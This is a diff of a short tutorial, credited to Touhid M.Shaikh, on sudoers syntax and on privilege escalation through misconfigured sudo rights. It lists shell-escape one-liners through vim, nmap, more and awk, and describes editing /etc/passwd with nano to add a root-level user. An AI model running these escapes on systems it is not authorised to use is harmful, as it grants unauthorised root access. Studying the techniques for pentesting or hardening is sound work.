@@ -1,3 +1,6 @@
+---- Credits to Touhid M.Shaikh ----
+
+
 Sudoers File
 
   
@@ -8,15 +11,19 @@ SUDOers
   
  
 Sudoer File Syntax.
-root ALL=(ALL) ALL
+
+  root ALL=(ALL) ALL
+
 Explain 1: The root user can execute from ALL terminals, acting as ALL (any) users, and run ALL (any) command.
 
 The first part is the user, the second is the terminal from where the user can use the sudocommand, the third part is which users he may act as, and the last one is which commands he may run when using.sudo
 
-touhid ALL= /sbin/poweroff
-Explain 2: The above command, makes the user touhid can from any terminal, run the command power off using touhid’s user password.
+  user1 ALL= /sbin/poweroff
+  
+Explain 2: The above command, makes the user user1 can from any terminal, run the command power off using user1’s user password.
 
-touhid ALL = (root) NOPASSWD: /usr/bin/find
+  user1 ALL = (root) NOPASSWD: /usr/bin/find
+  
 Explain 3:  The above command, make the user touhid can from any terminal, run the command find as root user without password.
 
 Exploiting SUDO Users.
@@ -40,10 +47,10 @@ sudo vim -c '!sh'
 Using Nmap Command
 Old way.
 
-sudo nmap --interactive
-nmap> !sh
-sh-4.1#
-Note : nmap –interactive option not available in latest nmap.
+  sudo nmap --interactive
+  nmap> !sh
+  sh-4.1#
+  Note : nmap –interactive option not available in latest nmap.
 
 Latest Way without –interactive
 
@@ -58,7 +65,9 @@ sudo more /etc/hosts
 after that press !sh and hit enter
 
 Using awk Command
+
  sudo awk 'BEGIN {system("/bin/sh")}'
+ 
 Using nano Command
 nano is text editor using this editor u can modify passwd file and add a user in passwd file as root privilege after that u need to switch user. Add this line in /etc/passwd to order to add the user as root privilege.
 
